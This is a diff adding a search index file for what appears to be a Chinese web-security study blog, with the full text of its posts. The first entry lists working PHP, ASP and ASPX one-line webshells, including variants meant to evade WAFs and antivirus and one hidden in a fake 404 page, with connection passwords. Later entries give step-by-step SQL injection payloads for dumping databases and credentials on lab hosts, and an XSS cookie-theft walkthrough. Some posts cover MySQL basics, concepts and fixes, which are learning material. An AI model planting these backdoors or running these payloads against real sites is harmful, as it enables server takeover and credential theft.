@@ -1,0 +1,245 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title><![CDATA[一句话木马源代码]]></title>
+    <url>%2F2019%2F08%2F09%2F%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%BA%90%E4%BB%A3%E7%A0%81%2F</url>
+    <content type="text"><![CDATA[PHP一句话：1、普通一句话：&lt;?php @eval($_POST[123456]); ?&gt; *post后面中括号里面的内容是使用菜刀或蚁剑连接时的密码 2、防爆破一句话：&lt;?php substr(md5($_REQUEST[&#39;x&#39;]),28)==&#39;6862&#39;&amp;&amp;eval($_REQUEST[&#39;password&#39;]); ?&gt; *菜刀地址http://192.168.64.137/x.php?x=myh0st 3、过狗一句话:&lt;?php ($_=@$_GET[s]).@$_($_POST[hihack]) ?&gt; //菜刀地址 http://localhost/1.php?s=assert &lt;php $a = &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;; $a($_POST[hihack]); ?&gt; 4、404隐藏的一句话：​ &lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;​ &lt;html&gt;&lt;head&gt;​ &lt;title&gt;404 Not Found&lt;/title&gt;​ &lt;/head&gt;&lt;body&gt;​ &lt;h1&gt;Not Found&lt;/h1&gt;​ &lt;p&gt;The requested URL /error.php was not found on this server. &lt;/p&gt;​ &lt;/body&gt;&lt;/html&gt;​ &lt;?php​ @preg_replace(&quot;/[checksql]/e&quot;,$_POST[&#39;hihack&#39;],&quot;saft&quot;);​ ?&gt; ​ 菜刀连接时在配置栏添加： ​ &lt;O&gt;date=@eval($_POST[paxmac]);&lt;/O&gt; 5、不用问号(?)的一句话：&lt;script language=&quot;php&quot;&gt;eval ($_POST[hihack]);&lt;/script&gt; 6、躲避检测：&lt;?php assert($_REQUEST[&quot;hihack&quot;]);?&gt; 7、变形一句话后门： 访问该网页，然后菜刀连接：/myh0st.php 密码：hihack ASP一句话：1、普通一句话：&lt;%eval request(&quot;hihack&quot;)%&gt;或&lt;%execute(request(&quot;hihack&quot;))%&gt; 2、unicode编码的access木马 ：向access数据库插入 ┼攠數畣整爠煥敵瑳∨≡┩&gt; 编码前：&lt;% execute request(&quot;a&quot;)%&gt; 然后备份出webshell，密码a 3、配置文件插马（需要条件支持，插入的数据被写在了配置文件中）：插入：&quot;%&gt;&lt;% bbbb=request(&quot;aaaa&quot;)%&gt;&lt;%eval(bbbb)%&gt;&lt;%&#39; 访问报错，获取到配置文件的地址，然后连接，密码aaaa 4、不用%的一句话：&lt;script language=VBScript runat=server&gt;execute request(&quot;hihack&quot;)&lt;/script&gt; 5、不用双引号(“)的一句话：&lt;%eval request(chr(35))%&gt; 密码：# ASPX一句话：1、普通一句话：​ &lt;%@ Page Language=”Jscript”%&gt; &lt;%eval(Request.Item[“hihack”],”unsafe”);%&gt; 2、免杀一句话：&lt;%@PAGE LANGUAGE=JSCRIPT%&gt;&lt;%var PAY:String=Request[“\x61\x62\x63\x64”];eval(PAY,”\x75\x6E\x73\x61”+”\x66\x65”);%&gt;]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>文件上传漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[MySQL特殊数据库]]></title>
+    <url>%2F2019%2F08%2F09%2FMysql%E7%89%B9%E6%AE%8A%E6%95%B0%E6%8D%AE%E5%BA%93%2F</url>
+    <content type="text"><![CDATA[information_schema简介：在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。 information_schema数据库表说明:SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。 TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。 COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。 STATISTICS表：提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。 USER_PRIVILEGES表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。 SCHEMA_PRIVILEGES表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。 TABLE_PRIVILEGES表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。 COLUMN_PRIVILEGES表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。 CHARACTER_SETS表：提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。 COLLATIONS表：提供了关于各字符集的对照信息。 COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。 TABLE_CONSTRAINTS表：描述了存在约束的表。以及表的约束类型。 KEY_COLUMN_USAGE表：描述了具有约束的键列。 ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。 VIEWS表：给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。 TRIGGERS表：提供了关于触发程序的信息。必须有super权限才能查看该表]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>数据库基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[MySQL基础命令]]></title>
+    <url>%2F2019%2F08%2F09%2FMySQL%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%2F</url>
+    <content type="text"><![CDATA[MySql数据库操作基础#启动mysql服务器：net start mysql #关闭musql服务器：net stop mysql #显示数据库：show databases； #创建数据库:create database test; #删除数据库: drop database test; #使用该数据库:use test; #显示数据库中的表:show tables; #创建表: ​ create table student( ​ id int auto_increment primary key, ​ name varchar(50), ​ sex varchar(20), ​ date varchar(50), ​ content varchar(10), ​ )default charset=utf8; #删除表:drop table student; #查看表的结构:describe student; 可以简写为desc student; #插入数据 ​ insert into student values(null,’aa’,’男’,’1988-10-2’,’……’); ​ insert into student values(null,’bb’,’女’,’1889-03-6’,’……’); ​ insert into student values(null,’cc’,’男’,’1889-08-8’,’……’); ​ insert into student values(null,’dd’,’女’,’1889-12-8’,’……’); ​ insert into student values(null,’ee’,’女’,’1889-09-6’,’……’); ​ insert into student values(null,’ff’,’null’,’1889-09-6’,’……’); #查询表中的数据:select * from student;select id,name from student; #修改某一条数据: update student set sex=’男’ where id=4; #删除数据:delete from student where id=5; #and 且: ​ select * from student where date&gt;’1988’ and date&lt;’1995’; #or 或: ​ select * from student where date&lt;’1988’ or date&gt;’1995’; #between: ​ select * from student where date between ‘1988’ and ‘1995’; #in 查询制定集合内的数据: ​ select * from student where id in (1,3,5); #排序 :升序(asc)和降序(desc)： ​ select * from student order by id asc; #分组查询 #聚合函数: ​ select max(id),name,sex from student group by sex; ​ select min(date) from student; ​ select avg(id) as ‘求平均’ from student; ​ select count(*) from student; #统计表中总数 ​ select count(sex) from student; #统计表中性别总数 ​ select sum(id) from student; #id的和 #查询第i条以后到第j条的数据(不包括第i条): ​ select * from student limit 2,5; #显示3-5条数据 #修改数据: ​ update c set age=66 where id=2; ​ update c set name=’花花’,age=21,sex=’女’ where id=2delete from c where age=21; #常用查询语句: ​ select name,age ,id from c ​ select * from c where age&gt;40 and age&lt;60; #and ​ select * from c where age&lt;40 or age&lt;60; #or ​ select * from c where age between 40 and 60 ;#between ​ select * from c where age in (30,48); #in 查询指定集合内的数据 ​ select * from c order by age desc; #order by （升序,降序） #分组查询: ​ select name,max(age) from c group by sex; #按性别查最大年龄 #聚合函数: ​ select min(age) from c; ​ select avg(age) as ‘平均年龄 ‘ from c; ​ select count(*) from c; #统计表中数据总数 ​ select sum(age) from c; #修改表的名字: ​ alter table tbl_name rename to new_name ​ alter table c rename to a; #表结构修改: ​ create table test( ​ id int not null auto_increment primary key, #设定主键 ​ name varchar(20) not null default ‘NoName’, #设定默认值 ​ department_id int not null, ​ position_id int not null, ​ unique (department_id,position_id) #设定唯一值 ​ ); #向表中增加一个字段(列): ​ alter table tablename add columnname type; ​ alter table tablename add(columnname type); ​ alter table test add columnname varchar(20); #修改表中某个字段的名字: ​ alter table tablename change columnname newcolumnname type; ​ alter table test change name uname varchar(50); #表position 增加列: ​ testalter table position add(test char(10)); #表position 修改列test: ​ alter table position modify test char(20) not null; #表position 修改列test默认值: ​ alter table position alter test set default ‘system’; #表position 去掉test 默认值: ​ alter table position alter test drop default; #表position 去掉列test: ​ alter table position drop column test; #表depart_pos 删除主键: ​ alter table depart_pos drop primary key; #表depart_pos 增加主键: ​ alter table depart_pos add primary key PK_depart_pos(department_id,position_id); #用文本方式将数据装入数据库表中: ​ load data local infile “D:/mysql.txt” into table MYTABLE; #导入.sql文件: ​ source d:/mysql.sql; #或者 /. d:/mysql.sql;]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>数据库基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[XSS应用]]></title>
+    <url>%2F2019%2F08%2F09%2FXSS%E5%BA%94%E7%94%A8%2F</url>
+    <content type="text"><![CDATA[搭建在线平台：网址：https://xsshs.cn/xss.php 注册并登录…… 生成项目：1、创建项目：登陆成功后，在主界面点击找到我的项目，并点击创建 2、设置项目名称和描述： 3、选择模块: 4、选择攻击代码并点击完成： 攻击目标网站：1、将上面复制的攻击代码粘贴到输入框，并提交 2、查看创建的项目，发现有一条新的内容 3、点击展开，查看有用信息 这里已经拿到了cookie 通过cookie登录网站：1、利用burp对登陆页面进行抓包 2、将盗取到的cookie替换包内的cookie 3、放包，登陆成功]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>XSS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[XSS进阶]]></title>
+    <url>%2F2019%2F08%2F09%2FXSS%E8%BF%9B%E9%98%B6%2F</url>
+    <content type="text"><![CDATA[XSS常见测试语句：&lt;scrip&gt;alert(/xss/)&lt;/scrip&gt; &lt;img src=x onerror=alert(/xss/)&gt; &lt;svg onload=alert(xss/)&gt; &lt;a href=javascript:alert(/xss/)&gt; 常见编码方式：1、JS编码：JS提供了四种字符编码的策略， 三个八进制数字，如果个数不够，在前面补0，列如:”e”的编码为“\145”. 两个十六进制数字，如果个数不够，在前面补0，列如“e”的编码为“\x65”. 四个十六进制数字，如果个数不够，在前面补0，列如“e”的编码为“\u0065” 对于一些控制字‘符，使用特殊的C类型的转义风格（例如\n和\r） 2、HTML 实体编码：命名实体：以&amp;开头，以分号结尾的，列如“&lt;”的编码是“&amp;lt“. 字符编码：十进制，十六进制ASCII码或Unicode字符编码，样式为“&amp;#数值；“， 列如“&lt;“ 可以编码为”&#060;“和 ”&amp;#x3c；“ 3、URL 编码这里的URL编码，也是两次URL全编码的结果。如果alert被过滤， 结果为:%25%36%31%25%36%43%25%36%35%25%37%32%25%37%34 在使用XSS编码测试时，需要考虑HTML渲染的顺序，特别是针对多种编码组合时，要选择合适的编码方式进行测试。 XSS漏洞修复建议因为XSS漏洞涉及输入和输出两部分，所以其修复也分为两种。 过滤输入的数据，包括““” “&lt;“ “&gt;” “on”等非法字符。 对输出到页面的数据进行相应的编码转换，包括HTML实体编码，JavaScript 编码等。 参考：https://www.freebuf.com/articles/web/153055.html在线生成js代码网站:https://xsshs.cn/xss.php]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>XSS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[XSS基础知识]]></title>
+    <url>%2F2019%2F08%2F09%2FXSS%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%2F</url>
+    <content type="text"><![CDATA[XSS概念：XSS(Cross Site Script)名为跨站脚本攻击，为了与层叠样式表CSS区分，将跨站脚本简写为XSS，主要危害是盗取用户信息，钓鱼，制造蠕虫等。 黑客通过HTML注入篡改了网页，插入了恶意脚本，从而在用户浏览网页时，实现控制用户浏览器行为的一种攻击方式。 黑客可以利用XSS盗取用户cookie，有了用户的cookie，可以使用用户的身份来正常访问站点。 XSS属于客户端代码注入，通常注入代码是JavaScript，区别于命令注入，SQL注入属于服务端代码注入。 判断是否存在XSS：可以通过输入构造的JavaScript代码，看页面是否能够弹出构造的弹窗。 例：alert(123) ​ ​ XSS分类：XSS根据效果的不同，可以分为反射型XSS，存储型XSS。DOM型XSS 1、反射型XSS：反射型XSS又称为非持久性XSS。 攻击方式：攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给目标用户当目标用户访问该链接时，服务器接受该目标用户的请求并进行处理，然后服务器把带有XSS代码的数据发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会触发XSS漏洞。 2、存储型XSS：存储型XSS又称为持久性XSS，攻击脚本将被永久地存放在服务器的数据库或文件中，具有很高的隐蔽性。 攻击方式：这种攻击多见于论坛，博客和留言板，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在他们的浏览器中得到执行。 3、DOM型XSS：DOM 型xss其实是一种特殊类型的反射型xss它是基于DOM文档对象模型的一种漏洞。 攻击方式：用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含xss代码。服务器的响应不会以任何形式包含攻击者的脚本。当用户的浏览器处理这个响应时，DOM对象就会处理xss代码，导致存在XSS漏洞。 *三种不同类型的XSS之间的区别： XSS常见攻击：盗取cookie 获得位置信息 …… 参考:https://blog.csdn.net/extremebingo/article/details/81176394]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>XSS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[SSRF]]></title>
+    <url>%2F2019%2F08%2F09%2FSSRF%2F</url>
+    <content type="text"><![CDATA[SSRF概念：SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，所有可以通过它攻击外网无法访问的内部系统，也就是把目标网站当中间人） SSRF漏洞产生原因：SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档，等等。 首先，我们要对目标网站的架构了解。比如 ： A网站，是一个所有人都可以访问的外网网站，B网站是一个他们内部的OA网站。 所以，我们普通用户只可以访问a网站，不能访问b网站。但是我们可以同过a网站做中间人，访问b网站，从而达到攻击b网站需求。 正常用户访问网站的流程是：输入A网站URL –&gt; 发送请求 –&gt; A服务器接受请求（没有过滤），并处理 –&gt;返回用户响应。 那网站有个请求是www.baidu,com/xxx.php?image=URL 那么产生SSRF漏洞的环节在哪里呢？安全的网站应接收请求后，检测请求的合法性。 产生的原因：服务器端的验证并没有对其请求获取图片的参数（image=）做出严格的过滤以及限制，导致A网站可以从其他服务器的获取数据。 例如：www.baidu.com/xxx.php?image=www.abc.com/1.jpg 如果我们将www.abd.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？如果存在该内网地址就会返回1xx 2xx 之类的状态码，不存在就会其他的状态码 终极简析: SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有检测这个请求是否合法的，然后服务器以他的身份来访问其他服务器的资源。 SSRF用途：*内外网的端口和服务扫描 *主机本地敏感数据的读取 *内外网主机应用程序漏洞利用 *内外Web站点漏洞的利用 SSRF漏洞的寻找：*通过URL地址分享网页内容 *转码服务 *在线翻译 *通过URL地址加载或下载图片 *图片，文章收藏功能 *未公开的api实现以及其他调用URL功能 *从URL关键字中寻找 ​ 如：share，wap，url，link，src，source，target，u，3g，display，sourceURL，imageURL，domain…… SSRF漏洞验证方法：*因为SSRF漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器端发送的，从而判断是否存在SSRF漏洞 *在页面源码中查找访问的资源地址，如果该资源地址类型为www.baidu.com/xxx.php?image=(地址)的就可能存在SSRF漏洞 参考：https://www.jianshu.com/p/d1d1c40f6d4c]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>SSRF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[时间盲注]]></title>
+    <url>%2F2019%2F08%2F09%2F%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%2F</url>
+    <content type="text"><![CDATA[例：http://172.16.13.53/web/time.php *判断注入点及类型，见SQL注入基本知识-判断注入类型 判断注入点及类型：http://172.16.13.53/web/time.php?id=1 and sleep(5) *通过页面响应时间判断存在哪种类型的注入 判断数据库长度：http://172.16.13.53/web/time.php?id=1 and if(length(database())&gt;=1,sleep(3),1) *if结构：if（x,y,z），若满足条件x，则执行y，否则执行z 爆库名：http://172.16.13.53/web/time.php?id=1 and if(substr(database(),1,1)=’t’,sleep(5),1) *此处及以下操作需用到Burp，参考SQL注入基本知识-利用Burp进行盲注 爆表名：http://172.16.13.53/web/time.php?id=1 and if(substr((select table_name from information_schema.tables where table_schema=’test’ limit 0,1),1,1)=’i’,sleep(5),1) 爆字段名：http://172.16.13.53/web/time.php?id=1 and if(substr((select column_name from information_schema.columns where table_schema=’test’ and table_name=’users’ limit 0,1),1,1)=’i’,sleep(5),1) 爆数值：http://172.16.13.53/web/time.php?id=1 and if(substr((select id from test.users limit 0,1),1,1)=’1’,sleep(5),1) 要点：*if结构语句的含义：if（x,y,z），若满足条件x，则执行y，否则执行z *从爆库开始，后面的操作需借助Burp]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[联合注入]]></title>
+    <url>%2F2019%2F08%2F09%2F%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%2F</url>
+    <content type="text"><![CDATA[例：http://127.0.0.1/web/union.php?id=1 *判断注入点及类型，见SQL注入基本知识-判断注入类型 判断字段数：http://127.0.0.1/web/union.php?id=1 order by 1-99 查看数据回显位置：http://127.0.0.1/web/union.php?id=1 union select 1,2,3,4,5,6 爆库名：http://127.0.0.1/web/union.php?id=1 union select 1,2,3,database(),5,6 爆表名：http://127.0.0.1/web/union.php?id=1 union select 1,2,3,(select group_concat(table_name) from information_schema.tables where table_schema=’test’),5,6 爆字段名：http://127.0.0.1/web/union.php?id=1 union select 1,2,3,(select group_concat(column_name) from information_schema.columns where TABLE_SCHEMA=’test’ and TABLE_NAME=’users’),5,6 爆数值：http://127.0.0.1/web/union.php?id=1 union select 1,2,3,(select group_concat(username,password) from test.users),5,6 要点：*若在查看回显位置时页面没有返回值，说明回显的数据没有地方存放，应该把id变成-1，以便回显数值，之后的操作同理。 *联合注入只能执行查询语句 *这里查询时因为有多个语句，所以用group-concat，这个语句的作用就是将所有的查询结果打包，以字符串的形式输出。还可以用limit进行逐个输出]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[宽字节注入]]></title>
+    <url>%2F2019%2F08%2F09%2F%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%2F</url>
+    <content type="text"><![CDATA[例：http://192.168.11.128/web/kuanzifu.php *判断注入点及类型，见SQL注入基本知识-判断注入类型 判断数据库字段数：http://192.168.11.128/web/kuanzifu.php?id=1%df&#39; order by 6–+ *此处的%df的作用是绕过转义，具体见文末 查看数据回显位置：http://192.168.11.128/web/kuanzifu.php?id=-1%df&#39; union select 1,2,3,4,5,6–+ 爆库名：http://192.168.11.128/web/kuanzifu.php?id=-1%df&#39; union select 1,(database()),3,4,5,6–+ 爆表名：http://192.168.11.128/web/kuanzifu.php?id=-1%df&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3,4,5,6–+ *此处不直接跟数据库名的原因是，单引号’会被转义，会导致查询出错，所以在数据库名的位置再嵌入一次查询 爆字段名：http://192.168.11.128/web/kuanzifu.php?id=-1%df&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=((select table_name from information_schema.tables where table_schema=database() limit 0,1))),3,4,5,6–+ *此处内嵌的查询表名语句只能用limit，不能用group_conat，因为此时是读取单个表，相当于table_name=’users’,这里table_name只能有一个表，不能同时有多个表 爆值：http://192.168.11.128/web/kuanzifu.php?id=-1%df&#39; union select 1,(select group_concat(id) from test.users),3,4,5,6–+ 要点（SQL注入绕过技巧之宽字节注入）：*宽字节注入，它的作用可以绕过转义，也是绕过转义的其中一个办法 *宽字节注入源于设置MySQL连接时错误配置为：set character_set_client=gbk；这样配置会引发编码转换从而导致的注入漏洞。(GBK导致的问题) *当GPC开启(php.inimagic_quotes_gpc = On)或使用addslashes函数过滤提交的参数时，测试注入点使用的单引号 ‘ 就会被转义为: \’，这个的作用就是对敏感函数的转义，让我们无法注入。 *如果存在宽字节注入，我们输入%df%27时首先经过上面提到的转义就会变成%df%5c%27(%5c就是反斜杠)。之后再数据库查询由于使用了GBK多字节编码，即在汉字编码范围内两个字节会被编码为一个汉字，然后MySQL服务器会对查询语句进行了GBK编码%df%5c转换成汉字，而单引号逃出了，这个时候就可以注入了。 *%df不是固定的，可以自己组合。只要是汉字就可以。在mysql中，用于转义（即在字符串中的符号前加上”\”）的函数有addslashes，mysql_real_escape_string，mysql_escape_string等，还有一种情况是magic_quote_gpc，不过高版本的PHP将去除这个特性。 *GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[二次注入]]></title>
+    <url>%2F2019%2F08%2F09%2F%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%2F</url>
+    <content type="text"><![CDATA[例：http://192.168.11.128/web/double1.php（注册页面） ​ http://192.168.11.128/web/double2.php（查询页面） **判断注入点及类型，见SQL注入基本知识-判断注入类型（查询页面进行） 在注册页面传入非法字符：http://192.168.11.128/web/double1.php?username=zr&#39; *这里的zr’注册之后会传进数据库储存，查询之后就会构造出一个语句 *注册完成后会在页面返回一个id值，用这个值在查询页面执行语句 在查询界面输入id进行查询：http://192.168.11.128/web/double2.php?id=6 *这里和普通的判断注入类型类似，只不过是先把构造语句放入数据库，再让他读取出来进行执行 查询字段数：http://192.168.11.128/web/double1.php?id=zr&#39; order by 5–+ http://192.168.11.128/web/double2.php?id=7 *和上面一样，将构造语句写入数据库，然后再从id读出，执行语句 查看数据回显位置：http://192.168.11.128/web/double1.php?id=zr&#39; union select 1,2,3–+ http://192.168.11.128/web/double2.php?id=8 爆库名：http://192.168.11.128/web/double1.php?username=zr&#39; union select 1,(database()),3–+ http://192.168.11.128/web/double2.php?id=9 爆表名：http://192.168.11.128/web/double1.php?username=zr&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’test’),3–+ http://192.168.11.128/web/double2.php?id=10 爆字段名：http://192.168.11.128/web/double1.php?username=zr&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=’test’ and table_name=’users’),3–+ http://192.168.11.128/web/double2.php?id=11 爆数值:http://192.168.11.128/web/double1.php?username=zr&#39; union select 1,(select group_concat(id) from test.users),3–+ http://192.168.11.128/web/double2.php?id=12 要点：*二次注入的原理就是，将构造语句传入数据库并储存，然后查询时语句就会被执行 *这里的注册页面没有输入框，直接使用的是url，若注册页面有输入框，就不用再url里面注册，直接在注册框注册即可]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[堆叠注入]]></title>
+    <url>%2F2019%2F08%2F09%2F%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%2F</url>
+    <content type="text"><![CDATA[例：http://192.168.11.128/web/duidie.php *判断注入点及类型，见SQL注入基本知识-判断注入类型 判断数据库长度：http://192.168.11.128/web/duidie.php?id=1;select if(length(database())&gt;=1,sleep(5),1) *这里堆叠注入采用了时间盲注，可见；后面语句和时间盲注并无差别 爆库名：http://192.168.11.128/web/duidie.php?id=1;select if(substr(database(),1,1)=’t’,sleep(5),1) *爆库名这里和盲注一样，使用Burp 爆表名：http://192.168.11.128/web/duidie.php?id=1;select if(substr((select table_name from information_schema.tables where table_schema=’test’ limit 0,1),1,1)=’i’,sleep(5),1) 爆字段名：http://192.168.11.128/web/duidie.php?id=1;select if(substr((select column_name from information_schema.columns where table_schema=’test’ and table_name=’users’ limit 0,1),1,1)=’i’,sleep(5),1) 爆数值：http://192.168.11.128/web/duidie.php?id=1;select if(substr((select id from test.users limit 0,1),1,1)=’1’,sleep(5),1) 要点：*分号；在数据库中表示一个语句结束，分号结束后再构造一条语句就表示堆叠注入 *此处是采用的时间盲注进行的，视具体情况而定 *堆叠注入相比联合注入，它能执行任何数据库语句，而联合注入只能执行查询语句]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[布尔盲注]]></title>
+    <url>%2F2019%2F08%2F09%2F%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%2F</url>
+    <content type="text"><![CDATA[例：http://172.16.13.55/web/boolean.php?id=1 *判断注入点及类型，见SQL注入基本知识-判断注入类型 判断数据库长度：http://172.16.13.55/web/boolean.php?id=1&#39; and length(database())&gt;=4–+ *此处为了判断数据库名的长度，如数据库为test，则长度为4 爆库名：http://172.16.13.55/web/boolean.php?id=1&#39; and substr(database(),1,1)=’a’–+ *substr为数据库的一种函数，它的作用是从一个字符串截取一部分返回。 *database()后面的1,1表示这个字符串的第一个字符，2,1表示第二个字符。 *此语句执行一次只能判断一个字符，需要结合Burp狙击手来爆破。 爆表名：http://172.16.13.55/web/boolean.php?id=1&#39; and substr((select table_name from information_schema.tables where table_schema=’test’ limit 0,1),1,1)=’a’–+ *limit 0,1表示从第几个字符串开始。例如，数据库中依次有person，user，password 三个表，0,1表示从person开始读取，1,1就表示从user读取。 爆字段名：http://172.16.13.55/web/boolean.php?id=1&#39; and substr((select column_name from information_schema.columns where table_schema=’test’ and table_name=’users’ limit 0,1),1,1)=’a’–+ 爆数值：http://172.16.13.55/web/boolean.php?id=1&#39; and substr((select id from test.users limit 0,1),1,1)=’a’–+ 要点：*当判断页面注入类型时，若页面只返回正确和错误，不返回报错信息时，只能采用盲注的方式。 *盲注执行一次代码判断的是一个字符，手工输入很消耗精力，需要用到Burp的狙击手来帮助，使用方式见SQL注入基本知识-利用Burp进行盲注。]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[报错注入]]></title>
+    <url>%2F2019%2F08%2F09%2F%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%2F</url>
+    <content type="text"><![CDATA[例：http://172.16.13.53/web/error.php *判断注入点及类型，见SQL注入基本知识-判断注入类型 爆库名：http://172.16.13.53/web/error.php?username=a&#39; and updatexml(1,concat(0x7e,(database()),0x7e),1)–+ *updatexml语法格式为以上形式 *0x7e转义过来是波浪符号~ 爆表名：http://172.16.13.53/web/error.php?username=a&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=’test’),0x7e),1)–+ 爆字段名：http://172.16.13.53/web/error.php?username=a&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=’test’ and table_name=’users’),0x7e),1)–+ 爆数值：http://172.16.13.53/web/error.php?username=a&#39; and updatexml(1,concat(0x7e,(select group_concat(username,password) from test.users ),0x7e),1)–+ 要点：*报错注入的条件是页面能返回报错的信息，能从报错信息中得到有用信息]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[SQL注入绕过技巧]]></title>
+    <url>%2F2019%2F08%2F09%2FSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%2F</url>
